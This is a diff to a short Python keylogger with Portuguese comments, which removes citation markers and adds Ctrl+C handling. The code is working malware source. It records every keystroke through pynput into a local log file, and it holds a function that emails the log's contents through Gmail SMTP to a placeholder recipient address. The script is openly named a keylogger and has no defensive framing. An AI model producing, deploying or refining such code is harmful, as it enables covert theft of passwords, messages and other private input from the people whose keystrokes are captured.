@@ -1,34 +1,40 @@
 from pynput import keyboard
 import smtplib
 
-# Arquivo para salvar os logs [7]
+# Arquivo para salvar os logs
 log_file = "log.txt"
 
 def on_press(key):
     try:
-        # Captura teclas alfanuméricas [8]
+        # Captura teclas alfanuméricas
         char = key.char
     except AttributeError:
-        # Captura teclas especiais (Espaço, Enter, etc.) [8]
+        # Captura teclas especiais (Espaço, Enter, etc.)
         char = f" [{key}] "
     
     with open(log_file, "a") as f:
         f.write(char)
 
-# Função para envio por e-mail (Exemplo simplificado) [9, 10]
+# Função para envio por e-mail (Exemplo simplificado)
 def enviar_email():
-    # Nota: Use "senhas de app" para o login [7, 11]
+    # Nota: Use "senhas de app" para o login do Gmail
     usuario = "seu_email@gmail.com"
     senha = "sua_senha_de_app" 
     
     with smtplib.SMTP("smtp.gmail.com", 587) as servidor:
-        servidor.starttls() # Criptografa a comunicação [12]
-        servidor.login(usuario, senha) [11]
+        servidor.starttls() # Criptografa a comunicação
+        servidor.login(usuario, senha)
         with open(log_file, "r") as f:
             corpo = f.read()
-        servidor.sendmail(usuario, "destino@email.com", corpo) [9]
+        servidor.sendmail(usuario, "destino@email.com", corpo)
 
-# Inicia o monitoramento em uma thread dedicada [8, 13]
-with keyboard.Listener(on_press=on_press) as listener:
+# Inicia o monitoramento com tratamento de interrupção (Ctrl+C)
+try:
     print("Keylogger em execução... Pressione Ctrl+C para parar.")
-    listener.join() [14]
+    # Inicia o monitoramento em uma thread dedicada
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+        
+except KeyboardInterrupt:
+    # Captura o sinal do Ctrl+C e encerra silenciosamente
+    print("\n[!] Captura interrompida pelo usuário. Encerrando o Keylogger de forma segura.")
